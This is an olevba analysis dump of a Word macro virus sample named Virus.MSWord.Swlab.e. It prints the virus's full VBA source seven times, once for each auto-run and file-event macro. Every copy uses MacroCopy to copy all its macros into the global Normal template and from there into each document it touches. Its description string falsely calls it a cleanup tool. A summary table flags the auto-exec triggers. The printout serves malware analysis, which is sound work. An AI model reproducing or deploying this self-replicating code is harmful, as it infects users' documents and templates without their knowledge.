olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Swlab.e
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Swlab.e - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO FileClose.bas 
in file: Virus.MSWord.Swlab.e - OLE stream: 'Macros/VBA/FileClose'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Installs AutoClose and PayLoad macros to help prevent the spread and contraction of the prank macros. Also cleans out your Normal template and runs the CleanAll macro."
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileClose.MAIN"
Dim FName$
Dim MacName$
Rem SkamWerks Labs Presents the Generic Concept Created by Skam

On Error GoTo -1: On Error GoTo ErrorHandler

     Rem What? No Payload?  WUSSY!

     FName$ = WordBasic.[FileName$]()
     MacName$ = FName$ + ":AutoOpen"

     WordBasic.MacroCopy MacName$, "Global:AutoOpen"
     WordBasic.MacroCopy MacName$, "Global:AutoClose"
     WordBasic.MacroCopy MacName$, "Global:AutoNew"
     WordBasic.MacroCopy MacName$, "Global:AutoExit"
     WordBasic.MacroCopy MacName$, "Global:FileOpen"
     WordBasic.MacroCopy MacName$, "Global:FileClose"
     WordBasic.MacroCopy MacName$, "Global:Skammy"

ErrorHandler:

On Error GoTo -1: On Error GoTo AutoOpenHandler
     MacName$ = FName$ + ":AutoOpen"
     WordBasic.MacroCopy "Global:AutoOpen", MacName$
AutoOpenHandler:

On Error GoTo -1: On Error GoTo AutoCloseHandler
    MacName$ = FName$ + ":AutoClose"
     WordBasic.MacroCopy "Global:AutoClose", MacName$
AutoCloseHandler:

On Error GoTo -1: On Error GoTo AutoNewHandler
     MacName$ = FName$ + ":AutoNew"
      WordBasic.MacroCopy "Global:AutoNew", MacName$
AutoNewHandler:

On Error GoTo -1: On Error GoTo AutoExitHandler
     MacName$ = FName$ + ":AutoExit"
     WordBasic.MacroCopy "Global:AutoExit", MacName$
AutoExitHandler:

On Error GoTo -1: On Error GoTo FileOpenHandler
     MacName$ = FName$ + ":FileOpen"
     WordBasic.MacroCopy "Global:FileOpen", MacName$
FileOpenHandler:

On Error GoTo -1: On Error GoTo FileCloseHandler
     MacName$ = FName$ + ":FileClose"
     WordBasic.MacroCopy "Global:FileClose", MacName$
FileCloseHandler:

On Error GoTo -1: On Error GoTo OtherNameHandler
     MacName$ = FName$ + ":Skammy"
     WordBasic.MacroCopy "Global:Skammy", MacName$
OtherNameHandler:
    
WordBasic.FileSaveAs Format:=1

Rem Virii Unite!

On Error GoTo -1: On Error GoTo 0:
On Error GoTo -1: On Error GoTo EndCode:



EndCode:

End Sub
-------------------------------------------------------------------------------
VBA MACRO AutoClose.bas 
in file: Virus.MSWord.Swlab.e - OLE stream: 'Macros/VBA/AutoClose'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Installs AutoClose and PayLoad macros to help prevent the spread and contraction of the prank macros. Also cleans out your Normal template and runs the CleanAll macro."
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.AutoClose.MAIN"
Dim FName$
Dim MacName$
Rem SkamWerks Labs Presents the Generic Concept Created by Skam

On Error GoTo -1: On Error GoTo ErrorHandler

     Rem What? No Payload?  WUSSY!

     FName$ = WordBasic.[FileName$]()
     MacName$ = FName$ + ":AutoOpen"

     WordBasic.MacroCopy MacName$, "Global:AutoOpen"
     WordBasic.MacroCopy MacName$, "Global:AutoClose"
     WordBasic.MacroCopy MacName$, "Global:AutoNew"
     WordBasic.MacroCopy MacName$, "Global:AutoExit"
     WordBasic.MacroCopy MacName$, "Global:FileOpen"
     WordBasic.MacroCopy MacName$, "Global:FileClose"
     WordBasic.MacroCopy MacName$, "Global:Skammy"

ErrorHandler:

On Error GoTo -1: On Error GoTo AutoOpenHandler
     MacName$ = FName$ + ":AutoOpen"
     WordBasic.MacroCopy "Global:AutoOpen", MacName$
AutoOpenHandler:

On Error GoTo -1: On Error GoTo AutoCloseHandler
    MacName$ = FName$ + ":AutoClose"
     WordBasic.MacroCopy "Global:AutoClose", MacName$
AutoCloseHandler:

On Error GoTo -1: On Error GoTo AutoNewHandler
     MacName$ = FName$ + ":AutoNew"
      WordBasic.MacroCopy "Global:AutoNew", MacName$
AutoNewHandler:

On Error GoTo -1: On Error GoTo AutoExitHandler
     MacName$ = FName$ + ":AutoExit"
     WordBasic.MacroCopy "Global:AutoExit", MacName$
AutoExitHandler:

On Error GoTo -1: On Error GoTo FileOpenHandler
     MacName$ = FName$ + ":FileOpen"
     WordBasic.MacroCopy "Global:FileOpen", MacName$
FileOpenHandler:

On Error GoTo -1: On Error GoTo FileCloseHandler
     MacName$ = FName$ + ":FileClose"
     WordBasic.MacroCopy "Global:FileClose", MacName$
FileCloseHandler:

On Error GoTo -1: On Error GoTo OtherNameHandler
     MacName$ = FName$ + ":Skammy"
     WordBasic.MacroCopy "Global:Skammy", MacName$
OtherNameHandler:
    
WordBasic.FileSaveAs Format:=1

Rem Virii Unite!

On Error GoTo -1: On Error GoTo 0:
On Error GoTo -1: On Error GoTo EndCode:



EndCode:

End Sub
-------------------------------------------------------------------------------
VBA MACRO FileOpen.bas 
in file: Virus.MSWord.Swlab.e - OLE stream: 'Macros/VBA/FileOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Installs AutoClose and PayLoad macros to help prevent the spread and contraction of the prank macros. Also cleans out your Normal template and runs the CleanAll macro."
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileOpen.MAIN"
Dim FName$
Dim MacName$
Rem SkamWerks Labs Presents the Generic Concept Created by Skam

On Error GoTo -1: On Error GoTo ErrorHandler

     Rem What? No Payload?  WUSSY!

     FName$ = WordBasic.[FileName$]()
     MacName$ = FName$ + ":AutoOpen"

     WordBasic.MacroCopy MacName$, "Global:AutoOpen"
     WordBasic.MacroCopy MacName$, "Global:AutoClose"
     WordBasic.MacroCopy MacName$, "Global:AutoNew"
     WordBasic.MacroCopy MacName$, "Global:AutoExit"
     WordBasic.MacroCopy MacName$, "Global:FileOpen"
     WordBasic.MacroCopy MacName$, "Global:FileClose"
     WordBasic.MacroCopy MacName$, "Global:Skammy"

ErrorHandler:

On Error GoTo -1: On Error GoTo AutoOpenHandler
     MacName$ = FName$ + ":AutoOpen"
     WordBasic.MacroCopy "Global:AutoOpen", MacName$
AutoOpenHandler:

On Error GoTo -1: On Error GoTo AutoCloseHandler
    MacName$ = FName$ + ":AutoClose"
     WordBasic.MacroCopy "Global:AutoClose", MacName$
AutoCloseHandler:

On Error GoTo -1: On Error GoTo AutoNewHandler
     MacName$ = FName$ + ":AutoNew"
      WordBasic.MacroCopy "Global:AutoNew", MacName$
AutoNewHandler:

On Error GoTo -1: On Error GoTo AutoExitHandler
     MacName$ = FName$ + ":AutoExit"
     WordBasic.MacroCopy "Global:AutoExit", MacName$
AutoExitHandler:

On Error GoTo -1: On Error GoTo FileOpenHandler
     MacName$ = FName$ + ":FileOpen"
     WordBasic.MacroCopy "Global:FileOpen", MacName$
FileOpenHandler:

On Error GoTo -1: On Error GoTo FileCloseHandler
     MacName$ = FName$ + ":FileClose"
     WordBasic.MacroCopy "Global:FileClose", MacName$
FileCloseHandler:

On Error GoTo -1: On Error GoTo OtherNameHandler
     MacName$ = FName$ + ":Skammy"
     WordBasic.MacroCopy "Global:Skammy", MacName$
OtherNameHandler:
    
WordBasic.FileSaveAs Format:=1

Rem Virii Unite!

On Error GoTo -1: On Error GoTo 0:
On Error GoTo -1: On Error GoTo EndCode:



EndCode:

End Sub
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Swlab.e - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Installs AutoClose and PayLoad macros to help prevent the spread and contraction of the prank macros. Also cleans out your Normal template and runs the CleanAll macro."
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.AutoOpen.MAIN"
Dim FName$
Dim MacName$
Rem SkamWerks Labs Presents the Generic Concept Created by Skam

On Error GoTo -1: On Error GoTo ErrorHandler

     Rem What? No Payload?  WUSSY!

     FName$ = WordBasic.[FileName$]()
     MacName$ = FName$ + ":AutoOpen"

     WordBasic.MacroCopy MacName$, "Global:AutoOpen"
     WordBasic.MacroCopy MacName$, "Global:AutoClose"
     WordBasic.MacroCopy MacName$, "Global:AutoNew"
     WordBasic.MacroCopy MacName$, "Global:AutoExit"
     WordBasic.MacroCopy MacName$, "Global:FileOpen"
     WordBasic.MacroCopy MacName$, "Global:FileClose"
     WordBasic.MacroCopy MacName$, "Global:Skammy"

ErrorHandler:

On Error GoTo -1: On Error GoTo AutoOpenHandler
     MacName$ = FName$ + ":AutoOpen"
     WordBasic.MacroCopy "Global:AutoOpen", MacName$
AutoOpenHandler:

On Error GoTo -1: On Error GoTo AutoCloseHandler
    MacName$ = FName$ + ":AutoClose"
     WordBasic.MacroCopy "Global:AutoClose", MacName$
AutoCloseHandler:

On Error GoTo -1: On Error GoTo AutoNewHandler
     MacName$ = FName$ + ":AutoNew"
      WordBasic.MacroCopy "Global:AutoNew", MacName$
AutoNewHandler:

On Error GoTo -1: On Error GoTo AutoExitHandler
     MacName$ = FName$ + ":AutoExit"
     WordBasic.MacroCopy "Global:AutoExit", MacName$
AutoExitHandler:

On Error GoTo -1: On Error GoTo FileOpenHandler
     MacName$ = FName$ + ":FileOpen"
     WordBasic.MacroCopy "Global:FileOpen", MacName$
FileOpenHandler:

On Error GoTo -1: On Error GoTo FileCloseHandler
     MacName$ = FName$ + ":FileClose"
     WordBasic.MacroCopy "Global:FileClose", MacName$
FileCloseHandler:

On Error GoTo -1: On Error GoTo OtherNameHandler
     MacName$ = FName$ + ":Skammy"
     WordBasic.MacroCopy "Global:Skammy", MacName$
OtherNameHandler:
    
WordBasic.FileSaveAs Format:=1

Rem Virii Unite!

On Error GoTo -1: On Error GoTo 0:
On Error GoTo -1: On Error GoTo EndCode:



EndCode:

End Sub
-------------------------------------------------------------------------------
VBA MACRO AutoExit.bas 
in file: Virus.MSWord.Swlab.e - OLE stream: 'Macros/VBA/AutoExit'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Installs AutoClose and PayLoad macros to help prevent the spread and contraction of the prank macros. Also cleans out your Normal template and runs the CleanAll macro."
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.AutoExit.MAIN"
Dim FName$
Dim MacName$
Rem SkamWerks Labs Presents the Generic Concept Created by Skam

On Error GoTo -1: On Error GoTo ErrorHandler

     Rem What? No Payload?  WUSSY!

     FName$ = WordBasic.[FileName$]()
     MacName$ = FName$ + ":AutoOpen"

     WordBasic.MacroCopy MacName$, "Global:AutoOpen"
     WordBasic.MacroCopy MacName$, "Global:AutoClose"
     WordBasic.MacroCopy MacName$, "Global:AutoNew"
     WordBasic.MacroCopy MacName$, "Global:AutoExit"
     WordBasic.MacroCopy MacName$, "Global:FileOpen"
     WordBasic.MacroCopy MacName$, "Global:FileClose"
     WordBasic.MacroCopy MacName$, "Global:Skammy"

ErrorHandler:

On Error GoTo -1: On Error GoTo AutoOpenHandler
     MacName$ = FName$ + ":AutoOpen"
     WordBasic.MacroCopy "Global:AutoOpen", MacName$
AutoOpenHandler:

On Error GoTo -1: On Error GoTo AutoCloseHandler
    MacName$ = FName$ + ":AutoClose"
     WordBasic.MacroCopy "Global:AutoClose", MacName$
AutoCloseHandler:

On Error GoTo -1: On Error GoTo AutoNewHandler
     MacName$ = FName$ + ":AutoNew"
      WordBasic.MacroCopy "Global:AutoNew", MacName$
AutoNewHandler:

On Error GoTo -1: On Error GoTo AutoExitHandler
     MacName$ = FName$ + ":AutoExit"
     WordBasic.MacroCopy "Global:AutoExit", MacName$
AutoExitHandler:

On Error GoTo -1: On Error GoTo FileOpenHandler
     MacName$ = FName$ + ":FileOpen"
     WordBasic.MacroCopy "Global:FileOpen", MacName$
FileOpenHandler:

On Error GoTo -1: On Error GoTo FileCloseHandler
     MacName$ = FName$ + ":FileClose"
     WordBasic.MacroCopy "Global:FileClose", MacName$
FileCloseHandler:

On Error GoTo -1: On Error GoTo OtherNameHandler
     MacName$ = FName$ + ":Skammy"
     WordBasic.MacroCopy "Global:Skammy", MacName$
OtherNameHandler:
    
WordBasic.FileSaveAs Format:=1

Rem Virii Unite!

On Error GoTo -1: On Error GoTo 0:
On Error GoTo -1: On Error GoTo EndCode:



EndCode:

End Sub
-------------------------------------------------------------------------------
VBA MACRO AutoNew.bas 
in file: Virus.MSWord.Swlab.e - OLE stream: 'Macros/VBA/AutoNew'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Installs AutoClose and PayLoad macros to help prevent the spread and contraction of the prank macros. Also cleans out your Normal template and runs the CleanAll macro."
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.AutoNew.MAIN"
Dim FName$
Dim MacName$
Rem SkamWerks Labs Presents the Generic Concept Created by Skam

On Error GoTo -1: On Error GoTo ErrorHandler

     Rem What? No Payload?  WUSSY!

     FName$ = WordBasic.[FileName$]()
     MacName$ = FName$ + ":AutoOpen"

     WordBasic.MacroCopy MacName$, "Global:AutoOpen"
     WordBasic.MacroCopy MacName$, "Global:AutoClose"
     WordBasic.MacroCopy MacName$, "Global:AutoNew"
     WordBasic.MacroCopy MacName$, "Global:AutoExit"
     WordBasic.MacroCopy MacName$, "Global:FileOpen"
     WordBasic.MacroCopy MacName$, "Global:FileClose"
     WordBasic.MacroCopy MacName$, "Global:Skammy"

ErrorHandler:

On Error GoTo -1: On Error GoTo AutoOpenHandler
     MacName$ = FName$ + ":AutoOpen"
     WordBasic.MacroCopy "Global:AutoOpen", MacName$
AutoOpenHandler:

On Error GoTo -1: On Error GoTo AutoCloseHandler
    MacName$ = FName$ + ":AutoClose"
     WordBasic.MacroCopy "Global:AutoClose", MacName$
AutoCloseHandler:

On Error GoTo -1: On Error GoTo AutoNewHandler
     MacName$ = FName$ + ":AutoNew"
      WordBasic.MacroCopy "Global:AutoNew", MacName$
AutoNewHandler:

On Error GoTo -1: On Error GoTo AutoExitHandler
     MacName$ = FName$ + ":AutoExit"
     WordBasic.MacroCopy "Global:AutoExit", MacName$
AutoExitHandler:

On Error GoTo -1: On Error GoTo FileOpenHandler
     MacName$ = FName$ + ":FileOpen"
     WordBasic.MacroCopy "Global:FileOpen", MacName$
FileOpenHandler:

On Error GoTo -1: On Error GoTo FileCloseHandler
     MacName$ = FName$ + ":FileClose"
     WordBasic.MacroCopy "Global:FileClose", MacName$
FileCloseHandler:

On Error GoTo -1: On Error GoTo OtherNameHandler
     MacName$ = FName$ + ":Skammy"
     WordBasic.MacroCopy "Global:Skammy", MacName$
OtherNameHandler:
    
WordBasic.FileSaveAs Format:=1

Rem Virii Unite!

On Error GoTo -1: On Error GoTo 0:
On Error GoTo -1: On Error GoTo EndCode:



EndCode:

End Sub
-------------------------------------------------------------------------------
VBA MACRO Skammy.bas 
in file: Virus.MSWord.Swlab.e - OLE stream: 'Macros/VBA/Skammy'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Installs AutoClose and PayLoad macros to help prevent the spread and contraction of the prank macros. Also cleans out your Normal template and runs the CleanAll macro."
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.Skammy.MAIN"
Dim FName$
Dim MacName$
Rem SkamWerks Labs Presents the Generic Concept Created by Skam

On Error GoTo -1: On Error GoTo ErrorHandler

     Rem What? No Payload?  WUSSY!

     FName$ = WordBasic.[FileName$]()
     MacName$ = FName$ + ":AutoOpen"

     WordBasic.MacroCopy MacName$, "Global:AutoOpen"
     WordBasic.MacroCopy MacName$, "Global:AutoClose"
     WordBasic.MacroCopy MacName$, "Global:AutoNew"
     WordBasic.MacroCopy MacName$, "Global:AutoExit"
     WordBasic.MacroCopy MacName$, "Global:FileOpen"
     WordBasic.MacroCopy MacName$, "Global:FileClose"
     WordBasic.MacroCopy MacName$, "Global:Skammy"

ErrorHandler:

On Error GoTo -1: On Error GoTo AutoOpenHandler
     MacName$ = FName$ + ":AutoOpen"
     WordBasic.MacroCopy "Global:AutoOpen", MacName$
AutoOpenHandler:

On Error GoTo -1: On Error GoTo AutoCloseHandler
    MacName$ = FName$ + ":AutoClose"
     WordBasic.MacroCopy "Global:AutoClose", MacName$
AutoCloseHandler:

On Error GoTo -1: On Error GoTo AutoNewHandler
     MacName$ = FName$ + ":AutoNew"
      WordBasic.MacroCopy "Global:AutoNew", MacName$
AutoNewHandler:

On Error GoTo -1: On Error GoTo AutoExitHandler
     MacName$ = FName$ + ":AutoExit"
     WordBasic.MacroCopy "Global:AutoExit", MacName$
AutoExitHandler:

On Error GoTo -1: On Error GoTo FileOpenHandler
     MacName$ = FName$ + ":FileOpen"
     WordBasic.MacroCopy "Global:FileOpen", MacName$
FileOpenHandler:

On Error GoTo -1: On Error GoTo FileCloseHandler
     MacName$ = FName$ + ":FileClose"
     WordBasic.MacroCopy "Global:FileClose", MacName$
FileCloseHandler:

On Error GoTo -1: On Error GoTo OtherNameHandler
     MacName$ = FName$ + ":Skammy"
     WordBasic.MacroCopy "Global:Skammy", MacName$
OtherNameHandler:
    
WordBasic.FileSaveAs Format:=1

Rem Virii Unite!

On Error GoTo -1: On Error GoTo 0:
On Error GoTo -1: On Error GoTo EndCode:



EndCode:

End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

